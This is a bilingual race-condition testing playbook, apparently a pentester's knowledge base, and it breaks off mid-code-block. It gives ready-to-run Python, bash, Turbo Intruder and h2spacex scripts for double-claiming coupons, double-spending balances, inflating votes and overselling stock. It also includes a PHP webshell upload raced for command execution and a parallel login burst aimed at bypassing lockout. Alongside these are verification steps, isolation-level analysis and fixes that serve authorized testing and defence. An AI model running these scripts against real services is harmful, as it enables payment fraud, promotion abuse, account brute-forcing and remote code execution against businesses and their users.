> 结构：上半原有是主线（支付/券/库存）；下半补充加深（HTTP/2 单包、Turbo Intruder）。支付/券竞态先看原有，单包手法再开补充。
>
> 与 `src-value-hunting` 冲突时以 rules 为准。验证码并发只为打通登录/改密才报；纯短信轰炸不写。

## 一、原有知识库

# 竞态条件测试手册

## 一、竞态条件原理

### TOCTOU (Time-of-Check to Time-of-Use)

```
正常流程:
1. 检查条件（如余额是否充足）
2. 执行操作（扣款）

竞态条件:
线程A: 检查余额100 → 扣款50
线程B: 检查余额100 → 扣款50
结果: 余额应为0，实际可能为50或-50
```

对象存储配了「不存在则回源」、检测和真正下载拆开时：对同一 key 边 PUT 边 DELETE，可绕过「先看对象在不在」。见 `ssrf-test.md`「COS 回源竞态」。**见了回源再打**，不是每站必打。

---

## 二、高危场景识别

### 2.1 优惠券/红包领取

```python
# 一次性资源重复获取
# 场景: 优惠券限领1次，但并发请求可领多次

import requests
import threading

url = "https://target.com/api/coupon/claim"
headers = {"Authorization": "Bearer TOKEN"}
data = {"couponId": "NEWUSER100"}

def claim():
    r = requests.post(url, headers=headers, json=data)
    print(r.json())

# 并发50次
threads = [threading.Thread(target=claim) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]

# 检查账户是否领到多张优惠券
```

### 2.2 余额/积分消费（双花攻击）

```python
# 场景: 余额100，同时发起2笔100的消费

import asyncio
import aiohttp

async def consume(session):
    async with session.post(
        "https://target.com/api/pay",
        headers={"Authorization": "Bearer TOKEN"},
        json={"amount": 100}
    ) as resp:
        return await resp.json()

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [consume(session) for _ in range(10)]
        results = await asyncio.gather(*tasks)
        for r in results:
            print(r)

asyncio.run(main())

# 检查: 是否成功消费超过余额的金额
```

### 2.3 投票/点赞（重复计数）

```bash
# 场景: 每人限投1票，但并发可投多票

for i in $(seq 1 20); do
  curl -X POST "https://target.com/api/vote" \
    -H "Authorization: Bearer $TOKEN" \
    -d '{"targetId": "123"}' &
done
wait

# 检查目标的票数是否增加超过1
```

### 2.4 文件上传后删除

```python
# 场景: 上传 webshell → 系统检测到恶意 → 删除
# 利用: 上传后立即并发访问，在删除前执行

import requests
import threading

def upload():
    files = {'file': ('shell.php', '<?php system($_GET["c"]); ?>')}
    requests.post("https://target.com/upload", files=files)

def access():
    for _ in range(100):
        r = requests.get("https://target.com/uploads/shell.php?c=id")
        if r.status_code == 200:
            print("成功执行:", r.text)
            break

# 线程1上传，线程2疯狂访问
t1 = threading.Thread(target=upload)
t2 = threading.Thread(target=access)
t1.start()
t2.start()
```

### 2.5 限量抢购（库存超卖）

```python
# 场景: 商品库存10，但100人同时下单

import requests
import threading

def buy():
    r = requests.post("https://target.com/api/order/create",
        headers={"Authorization": "Bearer TOKEN"},
        json={"goodsId": "LIMITED_ITEM", "count": 1})
    print(r.json())

threads = [threading.Thread(target=buy) for _ in range(100)]
[t.start() for t in threads]
[t.join() for t in threads]

# 检查: 是否有超过10个订单成功
```

### 2.6 验证码验证

```python
# 场景: 验证码验证后失效，但并发提交可绕过

import requests
import threading

code = "123456"  # 获取到的验证码

def submit():
    r = requests.post("https://target.com/api/verify",
        json={"phone": "13800138000", "code": code})
    print(r.json())

# 并发提交同一验证码
threads = [threading.Thread(target=submit) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]
```

---

## 三、测试工具与方法

### 3.1 HTTP/2 并发与单包攻击（Single Packet Attack）

**前提**：只用受控、可恢复的业务对象，记录初始余额/库存/领取次数，按请求预算从小批次开始。需要串行对照时使用等价的新对象或已核验复位的状态；不先消费竞态对象。结果按第四节核验，错误或未复现都不等于无竞态。

**原理**：HTTP/2 多路复用支持并发流；真正的单包方法会先挂起各流，再集中释放完成请求所需的尾部。普通 `gather`、一个连接或 Nagle 都不保证单包/同时到达。下面 h2load/httpx 仅作并发实验；单包需支持 gate 的发送器及实际协议/时序证据。

#### h2load 用法

```bash
# 安装 h2load (nghttp2)
# Ubuntu: apt install nghttp2-client
# macOS: brew install nghttp2

# coupon.json 是本地请求体文件；先按本次预算调整请求数
h2load -n 50 -c 1 -m 50 \
  -H "Authorization: Bearer TOKEN" \
  -d coupon.json \
  -H "Content-Type: application/json" \
  https://target.com/api/coupon/claim

# 参数说明:
# -n: 总请求数
# -c: 并发连接数（1 个连接不保证单包）
# -m: 每个连接的最大并发流数
# -d: POST 数据文件路径，不是内联 JSON
# -H: 请求头
```

#### Python httpx 实现

```python
import httpx
import asyncio

async def http2_concurrent_test():
    """普通 HTTP/2 并发，不保证单包"""
    url = "https://target.com/api/coupon/claim"
    headers = {
        "Authorization": "Bearer TOKEN",
        "Content-Type": "application/json"
    }
    data = {"couponId": "NEWUSER100"}
    
    # 允许协商 HTTP/2；实际版本必须从响应核对
    async with httpx.AsyncClient(http2=True) as client:
        # 排队并发请求；不保证连接数、单包或服务端到达顺序
        tasks = [
            client.post(url, headers=headers, json=data)
            for _ in range(50)
        ]
        responses = await asyncio.gather(*tasks)
        
        for i, resp in enumerate(responses):
            print(f"请求 {i+1}: {resp.http_version} {resp.status_code} - {resp.text}")

asyncio.run(http2_concurrent_test())
```

### 3.2 Turbo Intruder（Burp 插件）

```python
# Burp → Extender → BApp Store → Turbo Intruder

# HTTP/1.1 多连接末字节 gate；不是 HTTP/2 单包
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=10,
                          requestsPerConnection=1,
                          pipeline=False,
                          engine=Engine.THREADED,
                          maxRetriesPerRequest=0)
    
    for i in range(10):
        engine.queue(target.req, gate='race1')
    
    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

### 3.3 Python asyncio + aiohttp

```python
import asyncio
import aiohttp
import time

async def race_condition_test(url, headers, data, count=2):
    """有界 HTTP/1.1 并发；只返回观察，不裁决漏洞。"""
    if not 1 <= count <= 50:
        raise ValueError("count must be between 1 and 50 for this batch")
    gate = asyncio.Event()

    async def send_request(session, index):
        await gate.wait()
        start = time.perf_counter()
        try:
            async with session.post(url, headers=headers, json=data,
                                    allow_redirects=False) as resp:
                body = await resp.read()
                return {"index": index, "status": resp.status, "body": body,
                        "elapsed": time.perf_counter() - start}
        except (aiohttp.ClientError, asyncio.TimeoutError) as exc:
            return {"index": index, "error": repr(exc),
                    "elapsed": time.perf_counter() - start}

    # H1 单连接会排队；每个待发请求有连接槽位，禁止用业务 POST 预热。
    connector = aiohttp.TCPConnector(limit=count, limit_per_host=count)
    timeout = aiohttp.ClientTimeout(total=10)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        tasks = [asyncio.create_task(send_request(session, i)) for i in range(count)]
        await asyncio.sleep(0)
        gate.set()
        return await asyncio.gather(*tasks)

# 使用示例
url = "https://target.com/api/coupon/claim"
headers = {"Authorization": "Bearer TOKEN"}
data = {"couponId": "NEWUSER100"}

results = asyncio.run(race_condition_test(url, headers, data, count=2))

# HTTP 状态只统计响应；传输失败保留为未知，不自动重试业务写入。
print(f"收到响应: {sum('status' in r for r in results)}/{len(results)}")
print(f"传输未完成: {sum('error' in r for r in results)}")

# 耗时相近不能证明请求重叠；需服务端时间线或受控接收端观察。
times = [r['elapsed'] for r in results]
print(f"最快: {min(times):.3f}s, 最慢: {max(times):.3f}s, 平均: {sum(times)/len(times):.3f}s")
```

此 gate 同时放行客户端协程，连接握手仍可能错峰。需要预热时仅用已确认无副作用的请求或握手，不能调用领取/扣款口，也不能用一次读请求冒称所有连接已预热。正式执行前记录 attempt/claim，完整原件与最终读回按 `docs/evidence-runners.md#native-http-execution` 捕获登记。

### 3.4 curl 并发

```bash
# 简单并发（网络抖动较大，效果较差）
for i in $(seq 1 50); do
  curl -X POST "https://target.com/api/coupon/claim" \
    -H "Authorization: Bearer TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"couponId":"NEWUSER100"}' &
done
wait

# 使用 GNU Parallel（更好的并发控制）
seq 1 50 | parallel -j 50 \
  'curl -X POST "https://target.com/api/coupon/claim" \
   -H "Authorization: Bearer TOKEN" \
   -H "Content-Type: application/json" \
   -d "{\"couponId\":\"NEWUSER100\"}"'
```

---

## 四、判断标准

### 如何确认竞态条件成功

先用串行对照确认业务不变量及正常幂等语义，再对等价初态做并发。只比较本批受控对象，等待异步任务收敛，排除其他流量、退款/取消和重复返回同一交易 ID。HTTP 200、`code=0`、快慢差只算响应信号；须有独立交易/记录及最终净变化支持，初态或最终状态缺失就保留未验证。

#### 4.1 余额/积分变化

```python
# 测试前记录余额
before = get_balance()

# 执行竞态测试
asyncio.run(race_condition_test(url, headers, data, count=2))

# 测试后检查余额
after = get_balance()

# expected_deduction 来自本批唯一已提交交易及业务规则，不是成功响应数
if before - after != expected_deduction:
    print("余额净变化不符，核对交易账本及串行对照后判断竞态")
```

#### 4.2 重复记录

```sql
-- 检查数据库是否有重复记录
SELECT coupon_id, user_id, COUNT(*) as count
FROM user_coupons
WHERE user_id = 'TEST_USER'
GROUP BY coupon_id, user_id
HAVING count > 1;
```

#### 4.3 库存异常

```python
# 隔离测试库存：记录初始可售量和初始订单 ID；下列 getter 需适配业务
stock_before = get_stock(goods_id="LIMITED_ITEM")
before_ids = {o['id'] for o in get_orders(goods_id="LIMITED_ITEM")}
asyncio.run(race_condition_test(url, headers, data, count=2))
# 等订单/库存收敛后，按唯一 ID 排除旧订单、幂等回包和未占库存的失败/取消单
orders = get_orders(goods_id="LIMITED_ITEM")
new_orders = {o['id']: o for o in orders
              if o['id'] not in before_ids and o['status'] == 'committed'}
committed_quantity = sum(o['quantity'] for o in new_orders.values())
stock_after = get_stock(goods_id="LIMITED_ITEM")

if committed_quantity > stock_before:
    print("新提交数量超过初始可售库存，结合对照确认超卖")
elif stock_before - stock_after != committed_quantity:
    print("库存与提交数量不一致，排除补货/退款/其他流量后再判断")
```

#### 4.4 响应内容分析

```python
# 一次性领取：先保存该受控用户/券的原记录，执行后从服务端重新查询
before_ids = {r['id'] for r in get_claims(user_id="TEST_USER", coupon_id="TEST_COUPON")}
results = asyncio.run(race_condition_test(url, headers, data, count=2))
after_ids = {r['id'] for r in get_claims(user_id="TEST_USER", coupon_id="TEST_COUPON")}
new_claims = after_ids - before_ids
print(f"HTTP 200 响应数: {sum(r.get('status') == 200 for r in results)}")
print(f"新增独立领取记录数: {len(new_claims)}")
# 多个 200 返回同一领取 ID 且最终只领一次，是幂等结果。
# 新增记录仍需核验有效额度/权益净增加，并与串行对照比较。
```

---

## 五、WooYun 实战模式

### 5.1 支付场景

```python
# 案例: 余额100，同时发起2笔100的支付
# 期望: 第二笔失败
# 实际: 两笔都成功，余额变为-100

async def double_spend_attack():
    url = "https://target.com/api/pay"
    headers = {"Authorization": "Bearer TOKEN"}
    data = {"orderId": "ORDER123", "amount": 100}
    
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post(url, headers=headers, json=data),
            session.post(url, headers=headers, json=data)
        ]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            print(await r.json())
```

### 5.2 优惠券场景

```python
# 案例: 同一优惠券并发使用多次
# 期望: 只能使用1次
# 实际: 使用了10次

async def coupon_reuse_attack():
    url = "https://target.com/api/order/create"
    headers = {"Authorization": "Bearer TOKEN"}
    data = {
        "goodsId": "ITEM123",
        "couponId": "DISCOUNT50"  # 50元优惠券
    }
    
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers, json=data) 
                for _ in range(10)]
        results = await asyncio.gather(*tasks)
        
        success = sum(1 for r in results if r.status == 200)
        print(f"HTTP 200 响应 {success} 次；实际用券次数按第四节读回核验")
```

### 5.3 签到/积分场景

```python
# 案例: 并发签到获得多倍积分
# 期望: 每日签到1次，获得10积分
# 实际: 并发签到20次，获得200积分

async def checkin_race():
    url = "https://target.com/api/checkin"
    headers = {"Authorization": "Bearer TOKEN"}
    
    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers) for _ in range(20)]
        results = await asyncio.gather(*tasks)
        
        for r in results:
            print(await r.json())
```

---

## 六、高级技巧

### 6.1 延迟释放（Delay Release）

```python
# 在检查和执行之间插入延迟，增加竞态窗口

# 服务端伪代码:
# balance = get_balance(user_id)
# if balance >= amount:
#     time.sleep(0.1)  # 人为延迟
#     deduct_balance(user_id, amount)

# 攻击: 在这0.1秒内发送多个请求
```

### 6.2 连接复用

```python
# 复用 TCP 连接，减少握手时间，提高并发度

import requests
from requests.adapters import HTTPAdapter

session = requests.Session()
adapter = HTTPAdapter(pool_connections=1, pool_maxsize=1)
session.mount('https://', adapter)

# 所有请求使用同一连接
for _ in range(50):
    session.post(url, headers=headers, json=data)
```

### 6.3 时间窗口探测

```python
# 先探测操作耗时，找到最佳攻击窗口

import time

def measure_timing():
    times = []
    for _ in range(10):
        start = time.time()
        requests.post(url, headers=headers, json=data)
        elapsed = time.time() - start
        times.append(elapsed)
    
    avg_time = sum(times) / len(times)
    print(f"平均响应时间: {avg_time:.3f}s")
    
    # 如果响应时间 > 100ms，竞态窗口较大
    return avg_time

# 根据响应时间调整并发数
avg_time = measure_timing()
if avg_time > 0.1:
    concurrent_count = 100  # 窗口大，增加并发
else:
    concurrent_count = 20   # 窗口小，减少并发
```

---

## 七、防护检测

```python
# 检测是否有竞态保护

# 1. 数据库锁（悲观锁）
# 特征: 并发请求时，后续请求等待前一个完成
# 检测: 观察响应时间是否呈阶梯状增长

# 2. 乐观锁（版本号）
# 特征: 并发请求时，只有一个成功，其他返回"版本冲突"
# 检测: 观察失败响应的错误信息

# 3. 分布式锁（Redis）
# 特征: 类似数据库锁
# 检测: 响应时间分析

# 4. 幂等性设计
# 特征: 重复请求返回相同结果，不产生副作用
# 检测: 多次发送相同请求，观察结果是否一致
```

---

## 九、注意事项

1. **测试范围**: 只在自己的测试账号上测试，不要影响其他用户
2. **测试强度**: 并发数不要过大（建议 ≤ 50），避免 DoS
3. **数据恢复**: 测试后检查账户状态，如有异常及时报告
4. **PoC 证据**: 保存测试前后的余额/积分截图，以及所有请求响应

---

## 二、补充：race-condition

### race-condition

### Race Conditions — Testing & Exploitation Playbook


## 0. QUICK START — What to Test First

Target endpoints where **check** and **update** are unlikely to be a single atomic database operation:

| Priority | Operation class | Example paths / parameters |
|----------|------------------|----------------------------|
| 1 | One-time redeem / coupon / bonus | `redeem`, `apply_coupon`, `claim_reward`, `voucher` |
| 2 | Balance / quota / stock deduction | `transfer`, `purchase`, `reserve`, `inventory` |
| 3 | Invite / referral / signup bonus | `invite_accept`, `referral_claim` |
| 4 | Password / email / MFA verification | `verify_token`, `confirm_email`, `reset_password` |
| 5 | Idempotent-looking APIs without strong keys | `POST` that should succeed only once per user |

**First moves (conceptual)**:

1. Capture the **state-changing** request in a proxy.
2. Send **20–100** copies **as simultaneously as your tooling allows**.
3. Classify outcome: **0/1 expected successes** vs **N successes** or **inconsistent final state**.

---

## 1. CORE CONCEPT

### 1.1 TOCTOU (Time-of-check to time-of-use)

```
Thread A                    Thread B
   |                            |
   +-- CHECK (resource OK)      |
   |                            +-- CHECK (resource OK)  ← both see "OK"
   +-- USE / UPDATE             |
   |                            +-- USE / UPDATE           ← duplicate effect
```

**TOCTOU** means the **decision** (check) and the **mutation** (use) are not one indivisible step.

### 1.2 Non-atomic read-then-write

Typical vulnerable pseudo-flow:

```text
balance = SELECT balance FROM accounts WHERE id = ?
if balance >= amount:
    UPDATE accounts SET balance = balance - ? WHERE id = ?
```

Two concurrent requests can both pass the `if` before either `UPDATE` commits.

### 1.3 Database-level vs application-level locking gaps

| Layer | What goes wrong |
|-------|------------------|
| **Application** | In-memory flag, cache, or session says "not used yet" while DB already updated — or the reverse. |
| **ORM / service** | Two instances, no distributed lock; each thinks it owns the decision. |
| **DB** | Missing `SELECT … FOR UPDATE`, wrong isolation level, or logic split across multiple statements without transaction. |
| **API gateway** | Per-IP rate limit is **check-then-increment** — parallel burst passes duplicate checks. |

**Hint**: `UNIQUE` constraints and **idempotency keys** often eliminate entire bug classes — test whether the app **enforces** them on the hot path.

---

## 2. ATTACK PATTERNS

### 2.1 Limit-overrun (double redeem / double claim)

Send the **same** authenticated request many times in parallel:

```http
POST /api/v1/rewards/claim HTTP/1.1
Host: target.example
Authorization: Bearer <token>
Content-Type: application/json

{"reward_id":"welcome_bonus"}
```

**Success signal**: HTTP `200`/`201` more than once, duplicate ledger entries, or balance higher than policy allows.

### 2.2 Rate-limit bypass via simultaneity

If limits are implemented as **counters checked per request** without atomic increment:

```http
POST /api/v1/login HTTP/1.1
Host: target.example
Content-Type: application/json

{"email":"victim@example.com","password":"wrong"}
```

Fire **N** parallel attempts in one wave; compare with **N** sequential attempts.

**Success signal**: more failures accepted than documented cap, or lockout never triggers when burst completes inside one window.

### 2.3 Multi-step exploitation (beat the pipeline)

Workflow: `create → pay → confirm`. If **confirm** does not cryptographically bind to **pay** completion:

1. Start two parallel pipelines from the same session/item.
2. Complete **confirm** on channel B while **pay** on channel A is still in-flight or abandoned.

**Success signal**: item marked paid/shipped without matching payment, or state skips backward.

---

## 3. HTTP/1.1 LAST-BYTE SYNCHRONIZATION

**Idea**: Hold all requests **blocked** until every socket has sent the full request **except the last byte** of the body; then release the final byte together so the server receives them in a tight cluster.

```text
Client 1: [headers + body - 1 byte] ----hold----+
Client 2: [headers + body - 1 byte] ----hold----+--> flush last byte together
Client N: [headers + body - 1 byte] ----hold----+
```

**Why**: Reduces **network jitter** between copies compared to naive sequential paste in Repeater.

**Tooling**: Custom scripts, some Burp extensions, or **Turbo Intruder** `gate` pattern (see §5) as the practical stand-in for synchronized release.

---

## 4. HTTP/2 SINGLE-PACKET ATTACK

**Idea**: Prepare incomplete HTTP/2 streams, then release their completion bytes together using a sender that implements this technique. Multiplexing alone does not provide that gate; confirm the actual negotiated protocol and release timing. Server scheduling may still serialize application work.

**Burp Repeater (modern workflows)**:

1. Open multiple tabs or select multiple requests.
2. Use **Send group (parallel)** / **single-packet attack** where available.
3. Prefer HTTP/2 to the target if supported.

```text
  [ Req A stream ]
  [ Req B stream ]  --HTTP/2-->  one burst -->  app worker pool
  [ Req C stream ]
```

**Why it often beats HTTP/1.1 last-byte tricks**: tighter alignment on the wire; less dependence on per-connection serialization.

---

## 5. TURBO INTRUDER TEMPLATES

Repository: [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) (Burp Suite extension).

### 5.1 Template 1 — Same endpoint, gate release

**Settings**: `concurrentConnections=30`, `requestsPerConnection=30`, use a **gate** so all threads fire together.

**Core pattern** (repeat N times, then release):

```python
for _ in range(N):
    engine.queue(request, gate='race1')
engine.openGate('race1')
```

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    for i in range(30):
        engine.queue(target.req, gate='race1')

    engine.openGate('race1')

def handleResponse(req, interesting):
    table.add(req)
```

**Header requirement** (unique per queued copy for log correlation; Turbo Intruder payload placeholder):

```http
x-request: %s
```

Turbo Intruder replaces `%s` per request when paired with a wordlist (or other payload source) — keep this header on the **base request** in Repeater before sending to Turbo Intruder. Case-insensitive for HTTP; use a consistent name for log grep.

### 5.2 Template 2 — Multi-endpoint, same gate

**Pattern**: One **POST** to **target-1** (state change) plus **many GETs** to **target-2** (read side) released together to widen the TOCTOU window observation.

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=30,
                           pipeline=False,
                           engine=Engine.THREADED,
                           maxRetriesPerRequest=0
                           )

    engine.queue(post_to_target1, gate='race1')
    for _ in range(30):
        engine.queue(get_target2, gate='race1')

    engine.openGate('race1')
```

Adjust hosts/paths by duplicating `RequestEngine` instances if endpoints differ (Turbo Intruder supports multiple engines — consult upstream docs for your Burp version).

---

## 6. CVE REFERENCE — CVE-2022-4037

**CVE-2022-4037** (GitLab CE/EE): race condition leading to **verified email address forgery** and risk when the product acts as an **OAuth identity provider** — third-party account linkage/impact scenarios. **CWE-362**. Demonstrated in public research with **HTTP/2 single-packet** style timing to win narrow windows.

**Takeaway for testers**: email verification, OAuth linking, and "confirm ownership" flows are high-value race targets — not only coupons and balances.

**References (official / neutral)**:

- [NVD — CVE-2022-4037](https://nvd.nist.gov/vuln/detail/CVE-2022-4037)
- GitLab security advisories and vendor CVE JSON for affected version ranges

---

## 7. TOOLS

| Tool | Role |
|------|------|
| [PortSwigger/turbo-intruder](https://github.com/PortSwigger/turbo-intruder) | High-concurrency replay, **gates**, scripting in Burp. |
| [JavanXD/Raceocat](https://github.com/JavanXD/Raceocat) | Race-focused HTTP client patterns (verify compatibility with your stack). |
| [nxenon/h2spacex](https://github.com/nxenon/h2spacex) | HTTP/2 low-level / single-packet style experimentation (use responsibly, authorized targets only). |
| **Burp Suite — Repeater** | **Send group (parallel)** / **single-packet attack** for multi-request synchronization. |

---

## 8. DECISION TREE

```text
                         START: state-changing API?
                                    |
                     NO -----------+---------- YES
                      |                        |
                   stop here              one-time / balance / verify?
                                                    |
                          +-------------------------+-------------------------+
                          |                         |                         |
                    coupon-like                 rate limit                  multi-step
                          |                         |                         |
                   parallel same req          parallel vs serial         parallel pipelines
                          |                         |                         |
                   duplicate success?           limit exceeded?          state mismatch?
                     /       \                    /       \                  /       \
                   YES       NO                 YES       NO               YES       NO
                    |         |                  |         |                |         |
              report +    try HTTP/2        report +    try TI        report +   deepen
              evidence    single-packet      evidence    gates                     per-step
                    |         |                  |         |                |         |
                    +----+----+                  +----+----+                +----+----+
                         |                            |                          |
                    tool pick                    tool pick                  tool pick
                         v                            v                          v
              Burp group / h2spacex            TI gates / Raceocat          TI + trace IDs
```

**How to confirm (evidence checklist)**:

1. **Reproducible** duplicate success under parallelism, not flaky single retries.
2. **Server-side** artifact: two rows, two emails, two grants, or wrong final balance.
3. **Correlate** with `x-request` (or similar) markers or unique body fields in logs (authorized environments).

**Routing summary**: if the scenario is more about business rules, pricing, or workflow bypass, load `logic-test.md`; this file focuses on **concurrency and transport-layer synchronization**.

---

## 9. HTTP/2 SINGLE-PACKET ATTACK — DETAILED MECHANICS

### 9.1 Completion Gates & Frame Coalescing

Hold back the bytes that complete each prepared HTTP/2 request, then release them as one bounded batch. Nagle, a single `sendall`, or disabling `TCP_NODELAY` cannot guarantee one TCP segment: TLS records, MSS, congestion and offload affect packetization. Use the sender's gate and wire/server observations; do not infer synchronization from the number of connections.

```text
Prepare streams:     [Stream 1 partial] [Stream 3 partial] [Stream 5 partial]
                            ↓ release completion gate ↓
Final byte/frame batch: [Stream 1 end | Stream 3 end | Stream 5 end]
```

- A library supporting only parallel requests is useful for a basic race, but is not a single-packet sender.
- Fit the completion batch to the observed transport; there is no universal requests-per-packet limit.

### 9.2 Server-Side Request Queue Processing

```text
NIC IRQ → kernel recv buffer → HTTP/2 demuxer → concurrent dispatch

  ┌─ Stream 1 → worker thread A ─┐
  ├─ Stream 3 → worker thread B ─┤  scheduling is implementation-dependent
  └─ Stream 5 → worker thread C ─┘
```

1. TCP provides a byte stream; `recv()` boundaries do not preserve packet boundaries.
2. The HTTP/2 parser demultiplexes frames as bytes become available.
3. Session locks, worker limits or application queues may still serialize requests.

Measure request overlap at the receiver when possible; client latency or stream numbering does not establish the server's race window.

### 9.3 HTTP/2 vs HTTP/1.1 Last-Byte Comparison

| Factor | HTTP/2 Single-Packet | HTTP/1.1 Last-Byte |
|--------|---------------------|-------------------|
| Connections needed | 1 | N (one per request) |
| Wire synchronization | Gated completion batch; verify packetization | Completion bytes released across connections |
| Network jitter impact | Reduced when completion bytes arrive together | Each connection has independent RTT |
| Server dispatch gap | Measure; application may serialize | Measure; application may serialize |
| Practical limit | Frame size, MSS and negotiated stream limit | Connection limits and setup |

### 9.4 Practical Execution with h2spacex

```python
import h2spacex

h2_conn = h2spacex.H2OnTCPSocket(
    hostname='target.example.com',
    port_number=443
)

headers_list = []
for i in range(20):
    headers_list.append([
        (':method', 'POST'),
        (':path', '/api/v1/rewards/claim'),
        (':authority', 'target.example.com'),
        (':scheme', 'https'),
        ('content-type', 'application/json'),
        ('authorization', 'Bearer TOKEN'),
    ])

h2_conn.setup_connection()
h2_conn.send_ping_frame()
h2_conn.send_multiple_requests_at_once(
    headers_list,
    body_list=[b'{"reward_id":"welcome_bonus"}'] * 20
)
responses = h2_conn.read_multiple_responses()
```

---

## 10. DATABASE ISOLATION LEVEL EXPLOITATION MATRIX

| Isolation Level | Phenomenon Exploited | Attack Window | Typical Vulnerable Pattern |
|----------------|---------------------|---------------|---------------------------|
| **READ UNCOMMITTED** | Dirty reads | Thread B reads Thread A's uncommitted write | `SELECT balance` sees in-flight deduction, proceeds with stale logic |
| **READ COMMITTED** | Non-repeatable reads (TOCTOU) | Both threads read committed balance, both pass check, both deduct | `SELECT` → app check → `UPDATE` without `FOR UPDATE` |
| **REPEATABLE READ** | Phantom reads | Snapshot isolation hides concurrent inserts; both threads see "0 claims" and insert | `INSERT IF NOT EXISTS` pattern without UNIQUE constraint |
| **SERIALIZABLE** | Advisory lock bypass | Application uses `pg_advisory_lock()` / `GET_LOCK()` with wrong scope or derivable key | Lock key from user input; session-vs-transaction scope mismatch |

### READ COMMITTED TOCTOU (most common in production)

```sql
-- Thread A                            -- Thread B
SELECT balance FROM accounts           SELECT balance FROM accounts
  WHERE id=1;  -- returns 100            WHERE id=1;  -- returns 100
-- app: 100 >= 100 ✓                   -- app: 100 >= 100 ✓
UPDATE accounts SET balance =          UPDATE accounts SET balance =
  balance - 100 WHERE id=1;             balance - 100 WHERE id=1;
COMMIT; -- balance = 0                 COMMIT; -- balance = -100 ← double-spend
```

**Fix verification**: `SELECT ... FOR UPDATE` should block Thread B's SELECT until Thread A commits.

### REPEATABLE READ Phantom Insert

```sql
-- Thread A (snapshot at T0)           -- Thread B (snapshot at T0)
SELECT count(*) FROM claims            SELECT count(*) FROM claims
  WHERE user_id=1 AND coupon='X';        WHERE user_id=1 AND coupon='X';
-- returns 0 (snapshot)                -- returns 0 (snapshot)
INSERT INTO claims ...;                INSERT INTO claims ...;
COMMIT; -- succeeds                    COMMIT; -- succeeds ← duplicate claim
```

**Fix**: `UNIQUE(user_id, coupon_id)` constraint causes one INSERT to fail with duplicate key error regardless of isolation level.

### SERIALIZABLE Advisory Lock Bypass

```sql
-- Application intends: one lock per coupon
SELECT pg_advisory_lock(hashtext('coupon_' || $coupon_id));
-- Bypass vectors:
--   1. Lock is session-scoped but transaction rolls back → lock persists, next txn skips
--   2. Different code path reaches claim logic without acquiring the lock
--   3. Attacker triggers claim via alternative API endpoint that lacks locking
```

### Quick Audit Checklist

```text
□ SHOW TRANSACTION ISOLATION LEVEL — what level is the database running?
□ Does the hot path use SELECT ... FOR UPDATE or explicit row locks?
□ Is the check-then-act sequence inside a single transaction?
□ Are UNIQUE constraints enforced on the critical state table?
□ Multi-instance deployment: is there a distributed lock (Redis SETNX / Zookeeper)?
```

---

## 11. LIMIT-OVERRUN ATTACK PATTERNS

### 11.1 Coupon / Promo Code Reuse

```text
Target:   POST /api/apply-coupon {"code":"SUMMER50"}
Expected: One use per user
Attack:   20 parallel identical requests
Evidence: Multiple 200 responses, final order total = N × discount applied
```

Variations: same coupon across different cart items; apply-coupon + checkout in parallel (coupon consumed only at checkout).

### 11.2 Vote / Rating Manipulation

```text
Target:   POST /api/vote {"post_id":123,"direction":"up"}
Expected: One vote per user per post
Attack:   50 parallel vote requests
Evidence: Vote count += N, or DB shows multiple vote rows for same user+post
```

### 11.3 Balance Double-Spend

```text
Target:   POST /api/transfer {"to":"attacker","amount":100}
Balance:  Exactly 100
Attack:   2+ parallel transfers
Evidence: Both succeed, sender balance goes negative, recipient receives 200
```

Higher-value variant: withdrawal to external system (crypto, bank wire) where reversal is difficult.

### 11.4 Inventory Oversell

```text
Target:   POST /api/purchase {"item_id":"limited_edition","qty":1}
Stock:    1 remaining
Attack:   20 parallel purchase requests
Evidence: Multiple orders created, stock counter goes negative
```

Compound attack: add-to-cart and checkout are separate steps, each checking inventory independently.

### 11.5 Referral / Signup Bonus

```text
Target:   POST /api/referral/claim {"code":"REF_ABC"}
Expected: One claim per referred user
Attack:   Parallel claims from same session
Evidence: Bonus credited to referrer multiple times
```

---

## 12. SINGLE-PACKET MULTI-ENDPOINT ATTACK

Instead of N copies of the same request, send requests to **different endpoints** in one HTTP/2 single-packet burst. This widens the TOCTOU window by hitting both the check and use paths simultaneously.

### Pattern 1: State-check + State-mutate

```text
Single TCP segment:
  Stream 1: GET  /api/balance       ← in-burst observation, not a baseline
  Stream 3: POST /api/transfer      ← mutate
  Stream 5: POST /api/transfer      ← mutate (duplicate)
  Stream 7: GET  /api/balance       ← in-burst observation, not final state
```

Stream IDs do not establish application execution order: either GET may run before or after either POST. Read the baseline before releasing the burst and the final balance after all writes settle. A difference between the two in-burst GETs alone proves neither a race nor an invariant violation; correlate unique committed transactions with the final state and a serial control.

### Pattern 2: Cross-resource race

```text
Single TCP segment:
  Stream 1: POST /api/coupon/apply   ← apply discount
  Stream 3: POST /api/order/checkout ← finalize order
```

If coupon application and checkout check prices independently, the discount may apply after checkout has locked the price.

### Pattern 3: Auth verification + Privileged action

```text
Single TCP segment:
  Stream 1: POST /api/email/verify?token=TOKEN  ← verify email
  Stream 3: POST /api/account/upgrade            ← requires verified email
```

Upgrade may succeed during the brief window where verification is processing but not yet committed.

### Practical setup

Burp Repeater: add requests targeting **different paths** to the same group → "Send group (single packet)".

```python
headers_balance = [(':method','GET'), (':path','/api/balance'), ...]
headers_transfer = [(':method','POST'), (':path','/api/transfer'), ...]

all_headers = [headers_balance] + [headers_transfer]*5 + [headers_balance]
all_bodies = [b''] + [b'{"to":"attacker","amount":100}']*5 + [b'']

